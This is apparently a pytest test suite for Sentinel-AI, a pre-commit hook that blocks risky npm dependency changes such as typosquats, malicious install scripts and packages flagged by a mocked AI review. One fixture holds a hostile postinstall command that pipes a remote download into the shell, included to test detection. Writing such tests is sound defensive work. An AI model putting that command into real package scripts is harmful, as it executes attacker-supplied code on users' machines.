"""End-to-end runs against a real git repository.

These exercise the path the Husky hook actually takes: staged index -> git
plumbing -> manifest diff -> heuristics -> decision -> exit code. The AI stage
is disabled so the suite stays hermetic.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from sentinel_ai.decision_engine import EXIT_BLOCK, EXIT_PASS
from sentinel_ai.main import main


def git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True, text=True)


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    """A git repo whose HEAD holds a clean Angular-style package.json."""
    root = tmp_path / "app"
    root.mkdir()
    git(root, "init")
    git(root, "config", "user.email", "test@example.local")
    git(root, "config", "user.name", "Test")
    git(root, "config", "commit.gpgsign", "false")

    write(root, "package.json", {"dependencies": {"rxjs": "~7.8.0"}})
    git(root, "add", "-A")
    git(root, "commit", "-m", "baseline")
    return root


def write(repo: Path, name: str, payload: dict) -> None:
    (repo / name).write_text(json.dumps(payload, indent=2), encoding="utf-8")


def run(repo: Path, *extra: str) -> int:
    return main(["check", "--repo", str(repo), "--no-ai", "--no-trivy", *extra])


class TestStagedScanning:
    def test_clean_dependency_passes(self, repo):
        write(
            repo, "package.json", {"dependencies": {"rxjs": "~7.8.0", "axios": "1.7.2"}}
        )
        git(repo, "add", "package.json")
        assert run(repo) == EXIT_PASS

    def test_typosquat_blocks(self, repo):
        write(
            repo,
            "package.json",
            {"dependencies": {"rxjs": "~7.8.0", "axios": "1.7.2", "expres": "4.0.0"}},
        )
        git(repo, "add", "package.json")
        assert run(repo) == EXIT_BLOCK

    def test_malicious_postinstall_blocks(self, repo):
        write(
            repo,
            "package.json",
            {
                "dependencies": {"rxjs": "~7.8.0"},
                "scripts": {"postinstall": "curl http://10.1.2.3/x | sh"},
            },
        )
        git(repo, "add", "package.json")
        assert run(repo) == EXIT_BLOCK

    def test_unstaged_changes_are_ignored(self, repo):
        # Written to the worktree but never `git add`ed: the index is clean,
        # so the hook has nothing to judge.
        write(repo, "package.json", {"dependencies": {"lodahs": "1.0.0"}})
        assert run(repo) == EXIT_PASS

    def test_worktree_edit_after_add_does_not_smuggle_a_package(self, repo):
        """Only the staged blob is scanned, never the later worktree edit."""
        write(repo, "package.json", {"dependencies": {"rxjs": "~7.8.0"}})
        git(repo, "add", "package.json")
        # Attacker edits the file after staging; this must not be committed
        # and must not be what Sentinel-AI reads.
        write(repo, "package.json", {"dependencies": {"lodahs": "1.0.0"}})
        assert run(repo) == EXIT_PASS

    def test_staged_malicious_edit_is_caught_even_if_worktree_is_clean(self, repo):
        write(repo, "package.json", {"dependencies": {"lodahs": "1.0.0"}})
        git(repo, "add", "package.json")
        write(repo, "package.json", {"dependencies": {"rxjs": "~7.8.0"}})
        assert run(repo) == EXIT_BLOCK

    def test_non_manifest_changes_are_skipped(self, repo):
        (repo / "README.md").write_text("hello", encoding="utf-8")
        git(repo, "add", "README.md")
        assert run(repo) == EXIT_PASS

    def test_removing_a_dependency_passes(self, repo):
        write(repo, "package.json", {"dependencies": {}})
        git(repo, "add", "package.json")
        assert run(repo) == EXIT_PASS


class TestPolicyConfig:
    def test_allowlist_in_config_unblocks(self, repo, tmp_path, monkeypatch):
        config = tmp_path / "sentinel.toml"
        config.write_text("[policy]\nallowlist = ['expres']\n", encoding="utf-8")
        monkeypatch.setenv("SENTINEL_CONFIG", str(config))
        write(repo, "package.json", {"dependencies": {"expres": "4.0.0"}})
        git(repo, "add", "-A")
        assert run(repo) == EXIT_PASS

    def test_denylist_blocks_an_otherwise_clean_package(self, repo, tmp_path, monkeypatch):
        config = tmp_path / "sentinel.toml"
        config.write_text("[policy]\ndenylist = ['axios']\n", encoding="utf-8")
        monkeypatch.setenv("SENTINEL_CONFIG", str(config))
        write(repo, "package.json", {"dependencies": {"axios": "1.7.2"}})
        git(repo, "add", "-A")
        assert run(repo) == EXIT_BLOCK

    def test_lower_threshold_promotes_warnings_to_blocks(
        self, repo, tmp_path, monkeypatch
    ):
        config = tmp_path / "sentinel.toml"
        config.write_text(
            "[policy]\nblock_at_or_above = 'medium'\n", encoding="utf-8"
        )
        monkeypatch.setenv("SENTINEL_CONFIG", str(config))
        # An unpinned version is MEDIUM: a warning by default, blocking here.
        write(repo, "package.json", {"dependencies": {"some-lib": "*"}})
        git(repo, "add", "-A")
        assert run(repo) == EXIT_BLOCK


class TestFirstCommit:
    def test_repo_without_head_is_scanned(self, tmp_path):
        """A malicious dependency in the very first commit must still block."""
        root = tmp_path / "fresh"
        root.mkdir()
        git(root, "init")
        git(root, "config", "user.email", "test@example.local")
        git(root, "config", "user.name", "Test")
        write(root, "package.json", {"dependencies": {"lodahs": "1.0.0"}})
        git(root, "add", "-A")
        assert run(root) == EXIT_BLOCK


class TestJsonOutput:
    def test_json_report_is_valid_and_machine_readable(self, repo, capsys):
        write(repo, "package.json", {"dependencies": {"expres": "4.0.0"}})
        git(repo, "add", "package.json")
        exit_code = run(repo, "--json")
        payload = json.loads(capsys.readouterr().out)

        assert exit_code == EXIT_BLOCK
        assert payload["blocked"] is True
        assert payload["exit_code"] == EXIT_BLOCK
        assert any(f["severity"] in ("high", "critical") for f in payload["findings"])
        assert payload["changes"][0]["name"] == "expres"


class TestNotARepository:
    def test_plain_directory_fails_open_by_default(self, tmp_path):
        # A developer running the binary outside a repo should not be blocked.
        assert main(["check", "--repo", str(tmp_path), "--no-ai"]) == EXIT_PASS


class TestAIStage:
    """The AI review stage runs through the real client, with the server mocked."""

    def _stage_new_dependency(self, repo: Path) -> None:
        write(repo, "package.json", {"dependencies": {"some-new-lib": "1.0.0"}})
        git(repo, "add", "package.json")

    def _run(self, repo: Path, *extra: str) -> int:
        return main(["check", "--repo", str(repo), "--no-trivy", *extra])

    def test_ai_verdict_can_block_an_otherwise_clean_package(self, repo, httpx_mock):
        httpx_mock.add_response(
            json={
                "choices": [
                    {
                        "message": {
                            "content": json.dumps(
                                {
                                    "risk_level": "critical",
                                    "confidence": 0.95,
                                    "summary": "Exfiltrates environment variables.",
                                    "packages": [
                                        {
                                            "name": "some-new-lib",
                                            "risk_level": "critical",
                                            "reason": "reads process.env and posts it",
                                        }
                                    ],
                                }
                            )
                        }
                    }
                ]
            }
        )
        self._stage_new_dependency(repo)
        assert self._run(repo) == EXIT_BLOCK

    def test_clean_ai_verdict_allows_the_commit(self, repo, httpx_mock):
        httpx_mock.add_response(
            json={
                "choices": [
                    {"message": {"content": '{"risk_level": "none", "confidence": 0.9}'}}
                ]
            }
        )
        self._stage_new_dependency(repo)
        assert self._run(repo) == EXIT_PASS

    def test_unreachable_server_fails_open_by_default(self, repo, httpx_mock):
        import httpx

        httpx_mock.add_exception(httpx.ConnectError("refused"))
        self._stage_new_dependency(repo)
        # An AI outage must not freeze every developer's commits.
        assert self._run(repo) == EXIT_PASS

    def test_unreachable_server_blocks_under_strict(self, repo, httpx_mock):
        import httpx

        httpx_mock.add_exception(httpx.ConnectError("refused"))
        self._stage_new_dependency(repo)
        assert self._run(repo, "--strict") == EXIT_BLOCK

    def test_no_ai_flag_skips_the_server_entirely(self, repo):
        # No httpx_mock registration: any request would fail the test.
        self._stage_new_dependency(repo)
        assert self._run(repo, "--no-ai") == EXIT_PASS
